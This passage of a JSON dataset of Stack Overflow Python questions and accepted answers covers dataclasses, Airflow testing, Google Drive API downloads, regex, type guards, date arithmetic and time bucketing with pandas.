'children']).iterrows(): \n        r1['portfolio'] = r1['name']\n        df = df.append(r1)\n        for _, r2 in pd.json_normalize(r1.children).iterrows(): \n            df = df.append(r2)\n            for _, r3 in pd.json_normalize(r2.children).iterrows(): \n                df = df.append(r3).append(pd.json_normalize(r3.children))\n    df['portfolio'].fillna(method='ffill', inplace=True)\n    trans = {'columns.' + c['key']: c['display_name'] for c in r['meta']['columns']}\n    cols = ['portfolio', 'name', 'entity_id', 'Adjusted Value (No Div, USD)', 'Current Quarter TWR (USD)', 'YTD TWR (USD)', 'TWR Audit Note']\n    df = df.rename(columns=trans)[cols].reset_index(drop=True)\n    return df\n\n"
}
{
    "Id": 71344648,
    "PostTypeId": 1,
    "Title": "How to define `__str__` for `dataclass` that omits default values?",
    "Body": "Given a dataclass instance, I would like print() or str() to only list the non-default field values.  This is useful when the dataclass has many fields and only a few are changed.\n@dataclasses.dataclass\nclass X:\n  a: int = 1\n  b: bool = False\n  c: float = 2.0\n\nx = X(b=True)\nprint(x)  # Desired output: X(b=True)\n\n",
    "AcceptedAnswerId": 71344649,
    "AcceptedAnswer": "The solution is to add a custom __str__() function:\n@dataclasses.dataclass\nclass X:\n  a: int = 1\n  b: bool = False\n  c: float = 2.0\n\n  def __str__(self):\n    \"\"\"Returns a string containing only the non-default field values.\"\"\"\n    s = ', '.join(f'{field.name}={getattr(self, field.name)!r}'\n                  for field in dataclasses.fields(self)\n                  if getattr(self, field.name) != field.default)\n    return f'{type(self).__name__}({s})'\n\nx = X(b=True)\nprint(x)        # X(b=True)\nprint(str(x))   # X(b=True)\nprint(repr(x))  # X(a=1, b=True, c=2.0)\nprint(f'{x}, {x!s}, {x!r}')  # X(b=True), X(b=True), X(a=1, b=True, c=2.0)\n\n\nThis can also be achieved using a decorator:\ndef terse_str(cls):  # Decorator for class.\n  def __str__(self):\n    \"\"\"Returns a string containing only the non-default field values.\"\"\"\n    s = ', '.join(f'{field.name}={getattr(self, field.name)}'\n                  for field in dataclasses.fields(self)\n                  if getattr(self, field.name) != field.default)\n    return f'{type(self).__name__}({s})'\n\n  setattr(cls, '__str__', __str__)\n  return cls\n\n@dataclasses.dataclass\n@terse_str\nclass X:\n  a: int = 1\n  b: bool = False\n  c: float = 2.0\n\n"
}
{
    "Id": 71221412,
    "PostTypeId": 1,
    "Title": "Dag run not found when unit testing a custom operator in Airflow",
    "Body": "I've written a custom operator (DataCleaningOperator), which corrects JSON data based on a provided schema.\nThe unit tests previously worked when I didn't have to instatiate a TaskInstance and provide the operator with a context. However, I've updated the operator recently to take in a context (so that it can use xcom_push).\nHere is an example of one of the tests:\nDEFAULT_DATE = datetime.today()\n\nclass TestDataCleaningOperator(unittest.TestCase):    \n    \"\"\"\n    Class to execute unit tests for the operator 'DataCleaningOperator'.\n    \"\"\"\n    def setUp(self) -> None:\n        super().setUp()\n        self.dag = DAG(\n            dag_id=\"test_dag_data_cleaning\",\n            schedule_interval=None,\n            default_args={\n                \"owner\": \"airflow\",\n                \"start_date\": DEFAULT_DATE,\n                \"output_to_xcom\": True,\n            },\n        )\n        self._initialise_test_data()\n\n    def _initialize_test_data() -> None:\n        # Test data set here as class variables such as self.test_data_correct\n        ...\n\n    def test_operator_cleans_dataset_which_matches_schema(self) -> None:\n        \"\"\"\n        Test: Attempt to clean a dataset which matches the provided schema.\n        Verification: Returns the original dataset, unchanged.\n        \"\"\"\n        task = DataCleaningOperator(\n            task_id=\"test_operator_cleans_dataset_which_matches_schema\",\n            schema_fields=self.test_schema_nest,\n            data_file_object=deepcopy(self.test_data_correct),\n            dag=self.dag,\n        )\n        ti = TaskInstance(task=task, execution_date=DEFAULT_DATE)\n        result: List[dict] = task.execute(ti.get_template_context())\n        self.assertEqual(result, self.test_data_correct)\n\nHowever, when the tests are run, the following error is raised:\nairflow.exceptions.DagRunNotFound: DagRun for 'test_dag_data_cleaning' with date 2022-02-22 12:09:51.538954+00:00 not found\n\nThis is related to the line in which a task instance is instantiated in test_operator_cleans_dataset_which_matches_schema.\nWhy can't Airflow locate the test_dag_data_cleaning DAG? Is there a specific configuration I've missed? Do I need to also create a DAG run instance or add the DAG to the dag bag manually if this test dag is outide of my standard DAG directory? All normal (non-test) dags in my dag dir run correctly.\nIn case it helps, my current Airflow version is 2.2.3 and the structure of my project is:\nairflow\n\u251c\u2500 dags\n\u251c\u2500 plugins\n|  \u251c\u2500 ...\n|  \u2514\u2500 operators\n|     \u251c\u2500 ...\n|     \u2514\u2500 data_cleaning_operator.py\n|\n\u2514\u2500 tests\n   \u251c\u2500 ...\n   \u2514\u2500 operators\n      \u2514\u2500 test_data_cleaning_operator.py\n\n",
    "AcceptedAnswerId": 71346981,
    "AcceptedAnswer": "The code have written is using Airflow 2.0 format of unit test. So when you upgraded to Airflow 2.2.3, the unit test requires you to create a dagrun before you create a test run.\nBelow is the sample code which worked for me:\nimport unittest\n\nimport pendulum\nfrom airflow import DAG\nfrom airflow.utils.state import DagRunState\nfrom airflow.utils.types import DagRunType\n\nfrom operators.test_operator import EvenNumberCheckOperator\n\nDEFAULT_DATE = pendulum.datetime(2022, 3, 4, tz='America/Toronto')\nTEST_DAG_ID = \"my_custom_operator_dag\"\nTEST_TASK_ID = \"my_custom_operator_task\"\n\n\nclass TestEvenNumberCheckOperator(unittest.TestCase):\n\n    def setUp(self):\n        super().setUp()\n        self.dag = DAG('test_dag4', default_args={'owner': 'airflow', 'start_date': DEFAULT_DATE})\n        self.even = 10\n        self.odd = 11\n        EvenNumberCheckOperator(\n            task_id=TEST_TASK_ID,\n            my_operator_param=self.even,\n            dag=self.dag\n        )\n\n\n    def test_even(self):\n        \"\"\"Tests that the EvenNumberCheckOperator returns True for 10.\"\"\"\n        dagrun = self.dag.create_dagrun(state=DagRunState.RUNNING,\n                                        execution_date=DEFAULT_DATE,\n                                        #data_interval=DEFAULT_DATE,\n                                        start_date=DEFAULT_DATE,\n                                        run_type=DagRunType.MANUAL)\n        ti = dagrun.get_task_instance(task_id=TEST_TASK_ID)\n        ti.task = self.dag.get_task(task_id=TEST_TASK_ID)\n        result = ti.task.execute(ti.get_template_context())\n        assert result is True\n\n"
}
{
    "Id": 71099818,
    "PostTypeId": 1,
    "Title": "WebSocket not working when trying to send generated answer by keras",
    "Body": "I am implementing a simple chatbot using keras and WebSockets. I now have a model that can make a prediction about the user input and send the according answer.\nWhen I do it through command line it works fine, however when I try to send the answer through my WebSocket, the WebSocket doesn't even start anymore.\nHere is my working WebSocket code:\n@sock.route('/api')\ndef echo(sock):\n    while True:\n        # get user input from browser\n        user_input = sock.receive()\n        # print user input on console\n        print(user_input)\n        # read answer from console\n        response = input()\n        # send response to browser\n        sock.send(response)\n\nHere is my code to communicate with the keras model on command line:\nwhile True:\n    question = input(\"\")\n    ints = predict(question)\n    answer = response(ints, json_data)\n    print(answer)\n\nUsed methods are those:\ndef predict(sentence):\n    bag_of_words = convert_sentence_in_bag_of_words(sentence)\n    # pass bag as list and get index 0\n    prediction = model.predict(np.array([bag_of_words]))[0]\n    ERROR_THRESHOLD = 0.25\n    accepted_results = [[tag, probability] for tag, probability in enumerate(prediction) if probability > ERROR_THRESHOLD]\n\n    accepted_results.sort(key=lambda x: x[1], reverse=True)\n\n    output = []\n    for accepted_result in accepted_results:\n        output.append({'intent': classes[accepted_result[0]], 'probability': str(accepted_result[1])})\n        print(output)\n    return output\n\n\ndef response(intents, json):\n    tag = intents[0]['intent']\n    intents_as_list = json['intents']\n    for i in intents_as_list:\n        if i['tag'] == tag:\n            res = random.choice(i['responses'])\n            break\n    return res\n\nSo when I start the WebSocket with the working code I get this output:\n * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)\n * Restarting with stat\n * Serving Flask app 'server' (lazy loading)\n * Environment: production\n   WARNING: This is a development server. Do not use it in a production deployment.\n   Use a production WSGI server instead.\n * Debug mode: on\n\nBut as soon as I have anything of my model in the server.py class I get this output:\n2022-02-13 11:31:38.887640: I tensorflow/core/common_runtime/pluggable_device/pluggable_device_factory.cc:305] Could not identify NUMA node of platform GPU ID 0, defaulting to 0. Your kernel may not have been built with NUMA support.\n2022-02-13 11:31:38.887734: I tensorflow/core/common_runtime/pluggable_device/pluggable_device_factory.cc:271] Created TensorFlow device (/job:localhost/replica:0/task:0/device:GPU:0 with 0 MB memory) -> physical PluggableDevice (device: 0, name: METAL, pci bus id: )\nMetal device set to: Apple M1\n\nsystemMemory: 16.00 GB\nmaxCacheSize: 5.33 GB\n\nIt is enough when I just have an import at the top like this: from chatty import response, predict - even though they are unused.\n",
    "AcceptedAnswerId": 71158506,
    "AcceptedAnswer": "I am devastated, I just wasted 2 days into the dumbest possible issue (and fix)\nI still had the\nwhile True:\n    question = input(\"\")\n    ints = predict(question)\n    answer = response(ints, json_data)\n    print(answer)\n\nin my model file, so the server didn't start. The fix was to delete it and now it works fine.\n"
}
{
    "Id": 71324369,
    "PostTypeId": 1,
    "Title": "Does time complexity change when two nested loops are re-written into a single loop?",
    "Body": "Is the time complexity of nested for, while, and if statements the same? Suppose a is given as an array of length n.\nfor _ in range(len(a)):\n    for _ in range(len(a)):\n        do_something\n\nThe for statement above will be O(n\u00b2).\ni = 0\nwhile i < len(a) * len(a):\n    do_something\n    i += 1\n\nAt first glance, the above loop can be thought of as O(n), but in the end I think that it is also O(n\u00b2).\nAm I right?\n",
    "AcceptedAnswerId": 71324413,
    "AcceptedAnswer": "\nAm I right?\n\nYes!\nThe double loop:\nfor _ in range(len(a)):\n    for _ in range(len(a)):\n        do_something\n\nhas a time complexity of O(n) * O(n) = O(n\u00b2) because each loop runs until n.\nThe single loop:\ni = 0\nwhile i < len(a) * len(a):\n    do_something\n    i += 1\n\nhas a time complexity of O(n * n) = O(n\u00b2), because the loop runs until i = n * n = n\u00b2.\n"
}
{
    "Id": 71116130,
    "PostTypeId": 1,
    "Title": "iPyKernel throwing \"TypeError: object NoneType can't be used in 'await' expression\"",
    "Body": "I know that several similar questions exist on this topic, but to my knowledge all of them concern an async code (wrongly) written by the user, while in my case it comes from a Python package.\nI have a Jupyter notebook whose first cell is\n! pip install numpy\n! pip install pandas\n\nand I want to automatically play the notebook using Papermill. No problem on my local machine (Windows 11 with Python 3.7): I install iPyKernel and Papermill and everything is fine.\nThe problem is when I try to do the same on my BitBucket pipeline (Python image 3-alpine, but it happens under different others); the first cell throws the following error:\nTraceback (most recent call last):\n  File \"/usr/local/lib/python3.7/site-packages/ipykernel/kernelbase.py\", line 461, in dispatch_queue\n    await self.process_one()\n  File \"/usr/local/lib/python3.7/site-packages/ipykernel/kernelbase.py\", line 450, in process_one\n    await dispatch(*args)\nTypeError: object NoneType can't be used in 'await' expression\n\nthat makes the script stop at the 2nd cell, where I import numpy.\nIf it can be relevant, I've \"papermilled\" under the GitLab CI without any problem in the past.\n",
    "AcceptedAnswerId": 71218064,
    "AcceptedAnswer": "Seems to be a bug in ipykernel 6.9.0 - options that worked for me:\n\nupgrade to 6.9.1 (latest version as of 2022-02-22); e.g. via pip install ipykernel --upgrade\ndowngrade to 6.8.0 (if upgrading messes with other dependencies you might have); e.g. via pip install ipykernel==6.8.0\n\n"
}
{
    "Id": 71228643,
    "PostTypeId": 1,
    "Title": "MWAA Airflow 2.2.2 'DAG' object has no attribute 'update_relative'",
    "Body": "So I was upgrading DAGs from airflow version 1.12.15 to 2.2.2 and DOWNGRADING python from 3.8 to 3.7 (since MWAA doesn't support python 3.8). The DAG is working fine on the previous setup but shows this error on the MWAA setup:\nBroken DAG: [/usr/local/airflow/dags/google_analytics_import.py] Traceback (most recent call last):\n  File \"/usr/local/lib/python3.7/site-packages/airflow/models/baseoperator.py\", line 1474, in set_downstream\n    self._set_relatives(task_or_task_list, upstream=False, edge_modifier=edge_modifier)\n  File \"/usr/local/lib/python3.7/site-packages/airflow/models/baseoperator.py\", line 1412, in _set_relatives\n    task_object.update_relative(self, not upstream)\nAttributeError: 'DAG' object has no attribute 'update_relative'\n\nThis is the built-in function that seems to be failing:\n\ndef set_downstream(\n        self,\n        task_or_task_list: Union[TaskMixin, Sequence[TaskMixin]],\n        edge_modifier: Optional[EdgeModifier] = None,\n    ) -> None:\n        \"\"\"\n        Set a task or a task list to be directly downstream from the current\n        task. Required by TaskMixin.\n        \"\"\"\n        self._set_relatives(task_or_task_list, upstream=False, edge_modifier=edge_modifier)\n\nThere is the code we are trying to run in the DAG:\n    for report in reports:\n        dag << PythonOperator(\n            task_id=f\"task_{report}\",\n            python_callable=process,\n            op_kwargs={\n                \"conn\": \"snowflake_production\",\n                \"table\": report,\n            },\n            provide_context=True,\n        )\n\nI am thinking this transition from Python 3.8 to 3.7 is causing this issue but I am not sure.\nDid anyone run across a similar issue ?\n",
    "AcceptedAnswerId": 71234167,
    "AcceptedAnswer": "For Airflow>=2.0.0 Assigning task to a DAG using bitwise shift (bit-shift) operators are no longer supported.\nTrying to do:\ndag = DAG(\"my_dag\")\ndummy = DummyOperator(task_id=\"dummy\")\n\ndag >> dummy\n\nWill not work.\nDependencies should be set only between operators.\nYou should use context manager:\nwith DAG(\"my_dag\") as dag:\n    dummy = DummyOperator(task_id=\"dummy\")\n\nIt already handles the relations of operator to DAG object.\nIf you prefer not to, then use the dag parameter in the operator constructor as: DummyOperator(task_id=\"dummy\", dag=dag)\n"
}
{
    "Id": 71351209,
    "PostTypeId": 1,
    "Title": "Why does `map` hide a `StopIteration`?",
    "Body": "I found a case when map() usage isn't equivalent to a list comprehension. It happens when next used as the first argument.\nFor example:\nl1 = [1, 2]\nl2 = ['hello', 'world']\niterators = [iter(l1), iter(l2)]\n\n# list comprehension\nvalues1 = [next(it) for it in iterators]\n# values1 = [1, \"hello\"]\nvalues2 = [next(it) for it in iterators]\n# values2 = [2, \"world\"]\nvalues3 = [next(it) for it in iterators]\n# raise StopIteration\n\nl1 = [1, 2]\nl2 = ['hello', 'world']\niterators = [iter(l1), iter(l2)]\n\n# map\nvalues1 = list(map(next, iterators))\n# values1 = [1, \"hello\"]\nvalues2 = list(map(next, iterators))\n# values2 = [2, \"world\"]\nvalues3 = list(map(next, iterators))\n# values3 = []\n# doesn't raise StopIteration\n\nAny other exceptions occur as they should.\nExample:\ndef divide_by_zero(value: int):\n    return value // 0\n\nl = [1, 2, 3]\nvalues = list(map(divide_by_zero, l))\n# raises ZeroDivisionError as expected\nvalues = [divide_by_zero(value) for value in l]\n# raises ZeroDivisionError as expected, too\n\nIt seems very strange. It works the same with Python 3.9 and Python 3.11.\nIt seems like map() works like this:\ndef map(func, iterator):\n    try:\n        while True:\n            item = next(iterator)\n            yield func(item)\n    except StopIteration:\n        pass\n\nbut I expected it to work like this:\ndef map(func, iterator):\n    while True:\n        try:\n            item = next(iterator)\n        except StopIteration:\n            break\n        yield func(item)\n\nIs it a bug?\n",
    "AcceptedAnswerId": 71351332,
    "AcceptedAnswer": "Try calling next on map:\n>>> >>> m = map(next, iterators)\n>>> next(m)\n1\n>>> next(m)\n'hello'\n>>> next(m)\nTraceback (most recent call last):\n  File \"\", line 1, in \nStopIteration\n\nIt's list that sees StopIteration and uses it to stop building the list from what map yields.\nThe list comprehension, on the other hand, is building the list by iterating over iterators, not a particular iterator in that list. That is, next(it) is used to produce a value for the list, not to determine if we've reached the end of iterators.\n"
}
{
    "Id": 71343002,
    "PostTypeId": 1,
    "Title": "Downloading files from public Google Drive in python: scoping issues?",
    "Body": "Using my answer to my question on how to download files from a public Google drive I managed in the past to download images using their IDs from a python script and Google API v3 from a public drive using the following bock of code:\nfrom google_auth_oauthlib.flow import Flow, InstalledAppFlow\nfrom googleapiclient.discovery import build\nfrom googleapiclient.http import MediaFileUpload, MediaIoBaseDownload\nfrom google.auth.transport.requests import Request\nimport io\nimport re\nSCOPES = ['https://www.googleapis.com/auth/drive']\nCLIENT_SECRET_FILE = \"myjson.json\"\nauthorized_port = 6006 # authorize URI redirect on the console\nflow = InstalledAppFlow.from_client_secrets_file(CLIENT_SECRET_FILE, SCOPES)\ncred = flow.run_local_server(port=authorized_port)\ndrive_service = build(\"drive\", \"v3\", credentials=cred)\nregex = \"(?<=https://drive.google.com/file/d/)[a-zA-Z0-9]+\"\nfor i, l in enumerate(links_to_download):\n    url = l\n    file_id = re.search(regex, url)[0]\n    request = drive_service.files().get_media(fileId=file_id)\n    fh = io.FileIO(f\"file_{i}\", mode='wb')\n    downloader = MediaIoBaseDownload(fh, request)\n    done = False\n    while done is False:\n        status, done = downloader.next_chunk()\n        print(\"Download %d%%.\" % int(status.progress() * 100))\n\nIn the mean time I discovered pydrive and pydrive2, two wrappers around Google API v2 that allows to do very useful things such as listing files from folders and basically allows to do the same thing with a lighter syntax:\nfrom pydrive.auth import GoogleAuth\nfrom pydrive.drive import GoogleDrive\nimport io\nimport re\nCLIENT_SECRET_FILE = \"client_secrets.json\"\n\ngauth = GoogleAuth()\ngauth.LocalWebserverAuth()\ndrive = GoogleDrive(gauth)\nregex = \"(?<=https://drive.google.com/file/d/)[a-zA-Z0-9]+\"\nfor i, l in enumerate(links_to_download):\n    url = l\n    file_id = re.search(regex, url)[0]\n    file_handle = drive.CreateFile({'id': file_id})\n    file_handle.GetContentFile(f\"file_{i}\")\n\nHowever now whether I use pydrive or the raw API I cannot seem to be able to download the same files and instead I am met with:\ngoogleapiclient.errors.HttpError: \n\nI tried everything and registered 3 different apps using Google console it seems it might be (or not) a question of scoping (see for instance this answer, with apps having access to only files in my Google drive or created by this app). However I did not have this issue before (last year).\nWhen going to the Google console explicitly giving https://www.googleapis.com/auth/drive as a scope to the API mandates filling a ton of fields with application's website/conditions of use/confidentiality rules/authorized domains and youtube videos explaining the app. However I will be the sole user of this script.\nSo I could only give explicitly the following scopes:\n/auth/drive.appdata\n/auth/drive.file\n/auth/drive.install\n\nIs it because of scoping ? Is there a solution that doesn't require creating a homepage and a youtube video ?\nEDIT 1:\nHere is an example of links_to_download:\nlinks_to_download = [\"https://drive.google.com/file/d/fileID/view?usp=drivesdk&resourcekey=0-resourceKeyValue\"]\n\nEDIT 2:\nIt is super instable sometimes it works without a sweat sometimes it doesn't. When I relaunch the script multiple times I get different results. Retry policies are working to a certain extent but sometimes it fails multiple times for hours.\n",
    "AcceptedAnswerId": 71351780,
    "AcceptedAnswer": "Well thanks to the security update released by Google few months before. This makes the link sharing stricter and you need resource key as well to access the file in-addition to the fileId.\nAs per the documentation , You need to provide the resource key as well for newer links, if you want to access it in the header X-Goog-Drive-Resource-Keys as fileId1/resourceKey1.\nIf you apply this change in your code, it will work as normal. Example edit below:\nregex = \"(?<=https://drive.google.com/file/d/)[a-zA-Z0-9]+\"\nregex_rkey = \"(?<=resourcekey=)[a-zA-Z0-9-]+\"\nfor i, l in enumerate(links_to_download):\n    url = l\n    file_id = re.search(regex, url)[0]\n    resource_key = re.search(regex_rkey, url)[0]\n    request = drive_service.files().get_media(fileId=file_id)\n    request.headers[\"X-Goog-Drive-Resource-Keys\"] = f\"{file_id}/{resource_key}\"\n    fh = io.FileIO(f\"file_{i}\", mode='wb')\n    downloader = MediaIoBaseDownload(fh, request)\n    done = False\n    while done is False:\n        status, done = downloader.next_chunk()\n        print(\"Download %d%%.\" % int(status.progress() * 100))\n\nWell, the regex for resource key was something I quickly made, so cannot be sure on if it supports every case. But this provides you the solution.\nNow, you may have to listen to old and new links based on this and set the changes.\n"
}
{
    "Id": 71349515,
    "PostTypeId": 1,
    "Title": "How to find all possible uniform substrings of a string?",
    "Body": "I have a string like\naaabbbbcca\n\nAnd I'd like to parse all possible uniform substrings from that. So my expected substrings for this string are\n['a', 'aa', 'aaa', 'b', 'bb', 'bbb', 'bbbb', 'c', 'cc', 'a']\n\nI tried the following\nimport re\n\nprint(re.findall(r\"([a-z])(?=\\1*)\", \"aaabbbbcca\"))\n# Output: ['a', 'a', 'a', 'b', 'b', 'b', 'b', 'c', 'c', 'a']\n\nIs it possible trough regular expressions? If yes, then how?\n",
    "AcceptedAnswerId": 71349674,
    "AcceptedAnswer": "You can achieve what you need without a regex here:\nresult = []\ntext = \"aaabbbbcca\"\nprev = ''\nfor c in text:\n  if c == prev:\n    result.append(result[-1] + c)\n  else:\n    result.append(c)\n    prev = c\n \nprint(result)\n# => ['a', 'aa', 'aaa', 'b', 'bb', 'bbb', 'bbbb', 'c', 'cc', 'a']\n\nSee the Python demo.\nIn short, you can iterate over the string and append new item to a result list when the new char is not equal to the previous char, otherwise, append a new item with the value equal to the previous item + the same char concatenated to the value.\nWith regex, the best you can do is\nimport re\ntext = \"aaabbbbcca\"\nprint( [x.group(1) for x in re.finditer(r'(?=((.)\\2*))', text)] )\n# => ['aaa', 'aa', 'a', 'bbbb', 'bbb', 'bb', 'b', 'cc', 'c', 'a']\n\nSee this Python demo. Here, (?=((.)\\2*)) matches any location inside the string that is immediately preceded with any one char (other than line break chars if you do not use re.DOTALL option) that is followed with zero or more occurrences of the same char (capturing the char(s) into Group 1).\n"
}
{
    "Id": 71029876,
    "PostTypeId": 1,
    "Title": "How can I perform a type guard on a property of an object in Python",
    "Body": "PEP 647 introduced type guards to perform complex type narrowing operations using functions. If I have a class where properties can have various types, is there a way that I can perform a similar type narrowing operation on the property of an object given as the function argument?\nclass MyClass:\n    a: Optional[int]\n    b: Optional[str]\n    # Some other things\n\ndef someTypeGuard(my_obj: MyClass) -> ???:\n    return my_obj.a is not None\n\nI'm thinking it might be necessary for me to implement something to do with square brackets in type hints, but I really don't know where to start on this.\n",
    "AcceptedAnswerId": 71252167,
    "AcceptedAnswer": "TypeGuard annotations can be used to annotate subclasses of a class. If parameter types are specified for those classes, then MyPy will recognise the type narrowing operation successfully.\nclass MyClass:\n    a: Optional[int]\n    b: Optional[str]\n    # Some other things\n\n# Two hidden classes for the different types\nclass _MyClassInt(MyClass):\n    a: int\n    b: None\nclass _MyClassStr(MyClass):\n    a: None\n    b: str\n\n\ndef someTypeGuard(my_obj: MyClass) -> TypeGuard[_MyClassInt]:\n    \"\"\"Check if my_obj's `a` property is NOT `None`\"\"\"\n    return my_obj.a is not None\n\ndef someOtherTypeGuard(my_obj: MyClass) -> TypeGuard[_MyClassStr]:\n    \"\"\"Check if my_obj's `b` property is NOT `None`\"\"\"\n    return my_obj.b is not None\n\nSadly failure to narrow to one type doesn't automatically narrow to the other type, and I can't find an easy way to do this other than an assert someOtherTypeGuard(obj) in your else block.\nEven still this seems to be the best solution.\n"
}
{
    "Id": 71371909,
    "PostTypeId": 1,
    "Title": "How to calculate when one's 10000 day after his or her birthday will be",
    "Body": "I am wondering how to solve this problem with basic Python (no libraries to be used): How can I calculate when one's 10000 day after their birthday will be (/would be)?\nFor instance, given Monday 19/05/2008, the desired day is Friday 05/10/2035 (according to https://www.durrans.com/projects/calc/10000/index.html?dob=19%2F5%2F2008&e=mc2)\nSo far I have done the following script:\nyears = range(2000, 2050)\nlst_days = []\ncount = 0\ntot_days = 0\nfor year in years:\n    if((year % 400 == 0) or  (year % 100 != 0) and  (year % 4 == 0)):\n        lst_days.append(366)\n    else:\n        lst_days.append(365)\nwhile tot_days <= 10000:\n        tot_days = tot_days + lst_days[count]\n        count = count+1\nprint(count)\n\nWhich estimates the person's age after 10,000 days from their birthday (for people born after 2000). But how can I proceed?\n",
    "AcceptedAnswerId": 71372125,
    "AcceptedAnswer": "Using base Python packages only\nOn the basis that \"no special packages\" means you can only use base Python packages, you can use datetime.timedelta for this type of problem:\nimport datetime\n\nstart_date = datetime.datetime(year=2008, month=5, day=19)\n\nend_date = start_date + datetime.timedelta(days=10000)\n\nprint(end_date.date())\n\nWithout any base packages (and progressing to the problem)\nSide-stepping even base Python packages, and taking the problem forwards, something along the lines of the following should help (I hope!).\nStart by defining a function that determines if a year is a leap year or not:\ndef is_it_a_leap_year(year) -> bool:\n    \"\"\"\n    Determine if a year is a leap year\n\n    Args:\n        year: int\n\n    Extended Summary:\n        According to:\n            https://airandspace.si.edu/stories/editorial/science-leap-year\n        The rule is that if the year is divisible by 100 and not divisible by\n        400, leap year is skipped. The year 2000 was a leap year, for example,\n        but the years 1700, 1800, and 1900 were not.  The next time a leap year\n        will be skipped is the year 2100.\n    \"\"\"\n    if year % 4 != 0:\n\n        return False\n\n    if year % 100 == 0 and year % 400 != 0:\n\n        return False\n\n    return True\n\nThen define a function that determines the age of a person (utilizing the above to recognise leap years):\ndef age_after_n_days(start_year: int,\n                     start_month: int,\n                     start_day: int,\n                     n_days: int) -> tuple:\n    \"\"\"\n    Calculate an approximate age of a person after a given number of days,\n    attempting to take into account leap years appropriately.\n\n    Return the number of days left until their next birthday\n\n    Args:\n        start_year (int): year of the start date\n        start_month (int): month of the start date\n        start_day (int): day of the start date\n        n_days (int): number of days to elapse\n    \"\"\"\n\n    # Check if the start date happens on a leap year and occurs before the\n    # 29 February (additional leap year day)\n    start_pre_leap = (is_it_a_leap_year(start_year) and start_month < 3)\n\n    # Account for the edge case where you start exactly on the 29 February\n    if start_month == 2 and start_day == 29:\n\n        start_pre_leap = False\n\n    # Keep a running counter of age\n    age = 0\n\n    # Store the \"current year\" whilst iterating through the days\n    current_year = start_year\n\n    # Count the number of days left\n    days_left = n_days\n\n    # While there is at least one year left to elapse...\n    while days_left > 364:\n\n        # Is it a leap year?\n        if is_it_a_leap_year(current_year):\n\n            # If not the first year\n            if age > 0:\n\n                days_left -= 366\n\n            # If the first year is a leap year but starting after the 29 Feb...\n            elif age == 0 and not start_pre_leap:\n\n                days_left -= 365\n\n            else:\n\n                days_left -= 366\n\n        # If not a leap year...\n        else:\n\n            days_left -= 365\n\n        # If the number of days left hasn't dropped below zero\n        if days_left >= 0:\n\n            # Increment age\n            age += 1\n\n            # Increment year\n            current_year += 1\n\n    return age, days_left\n\nUsing your example, you can test the function with:\nage, remaining_days = age_after_n_days(start_year=2000, start_month=5, start_day=19, n_days=10000)\n\nNow you have the number of complete years that will elapse and the number of remaining days\nYou can then use the remaining_days to work out the exact date.\n"
}
{
    "Id": 71491982,
    "PostTypeId": 1,
    "Title": "how to segment and get the time between two dates?",
    "Body": "I have the following table:\nid | number_of _trip |      start_date      |      end_date       | seconds\n1     637hui           2022-03-10 01:20:00    2022-03-10 01:32:00    720  \n2     384nfj           2022-03-10 02:18:00    2022-03-10 02:42:00    1440\n3     102fiu           2022-03-10 02:10:00    2022-03-10 02:23:00    780\n4     948pvc           2022-03-10 02:40:00    2022-03-10 03:20:00    2400\n5     473mds           2022-03-10 02:45:00    2022-03-10 02:58:00    780\n6     103fkd           2022-03-10 03:05:00    2022-03-10 03:28:00    1380\n7     905783           2022-03-10 03:12:00             null           0 \n8     498wsq           2022-03-10 05:30:00    2022-03-10 05:48:00    1080\n\nI want to get the time that is driven for each hour, but if a trip takes the space of two hours, the time must be taken for each hour.\nIf the end of the trip has not yet finished, the end_date field is null, but it must count the time it is taking in the respective hours from start_date.\nI have the following query:\nSELECT time_bucket(bucket_width := INTERVAL '1 hour',ts := start_date, \"offset\" := '0 minutes') AS init_date,\n       sum(seconds) as seconds\n        FROM trips\n        WHERE start_date >= '2022-03-10 01:00:00' AND start_date <= '2022-03-10 06:00:00'\n        GROUP BY init_date\n        ORDER BY init_date;\n\nThe result is:\n|   init_date         | seconds \n  2022-03-10 01:00:00    720\n  2022-03-10 02:00:00    5400\n  2022-03-10 03:00:00    1380\n  2022-03-10 05:00:00    1080\n\nHowever I expect to receive a result like this:\n|   init_date         | seconds     solo como una ayuda visual\n  2022-03-10 01:00:00    720          id(1:720)\n  2022-03-10 02:00:00    4200         id(2: 1440 3: 780 4: 1200 5: 780)\n  2022-03-10 03:00:00    5460         id(4:1200 6:1380 7:2880)\n  2022-03-10 05:00:00    1080         id(8:1080)\n\nEDIT\nIf I replace the null the result is still unwanted:\n|   init_date       | seconds \n2022-03-10 01:00:00   720\n2022-03-10 02:00:00   5400\n2022-03-10 03:00:00   1380\n2022-03-10 05:00:00   1080\n\nI have been thinking about getting all the data and solving the problem with pandas. I'll try and post if I get the answer.\nEDIT\nMy previous result was not entirely correct, since there were hours left of a trip that has not yet finished, the correct result should be:\n       start_date  seconds\n0 2022-03-10 01:00:00      720\n1 2022-03-10 02:00:00     4200\n2 2022-03-10 03:00:00     5460\n3 2022-03-10 04:00:00     3600\n4 2022-03-10 05:00:00     4680\n\nNEW CODE\ndef bucket_count(bucket, data):\n    result = pd.DataFrame()\n    list_r = []\n\n    for row_bucket in bucket.to_dict('records'):\n        inicio = row_bucket['start_date']\n        fin = row_bucket['end_date']\n\n        df = data[\n                (inicio <= data['end_date']) & (inicio <= fin) & (data['start_date'] <= fin) & (data['start_date'] <= data['end_date'])\n        ]\n        df_dict = df.to_dict('records')\n\n        for row in df_dict:\n            seconds = 0\n            if row['start_date'] >= inicio and fin >= row['end_date']:\n                seconds = (row['end_date'] - row['start_date']).total_seconds()\n            elif row['start_date'] <= inicio <= row['end_date'] <= fin:\n                seconds = (row['end_date'] - inicio).total_seconds()\n            elif inicio <= row['start_date'] <= fin <= row['end_date']:\n                seconds = (fin - row['start_date']).total_seconds()\n            elif row['start_date'] < inicio and fin < row['end_date']:\n                seconds = (fin - inicio).total_seconds()\n\n            row['start_date'] = inicio\n            row['end_date'] = fin\n            row['seconds'] = seconds\n            list_r.append(row)\n\n    result = pd.DataFrame(list_r)\n    return result.groupby(['start_date'])[\"seconds\"].apply(lambda x: x.astype(int).sum()).reset_index()\n\n",
    "AcceptedAnswerId": 71846320,
